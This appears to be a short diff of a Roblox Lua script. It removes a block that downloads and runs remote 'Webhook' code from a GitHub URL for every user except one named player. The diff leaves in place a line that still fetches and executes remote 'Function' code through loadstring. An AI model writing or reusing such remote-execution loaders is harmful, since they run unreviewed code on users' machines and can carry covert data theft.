@@ -87,11 +87,5 @@ RunService.RenderStepped:Connect(function()
 	InfoLabel.Text = result
 end)
 
-local player = game.Players.LocalPlayer
-
-if player.Name ~= "pomnawang" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/Obfuscate/refs/heads/main/Webhook"))()
-end
-end
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Generallua/Obfuscate/refs/heads/main/Function"))()
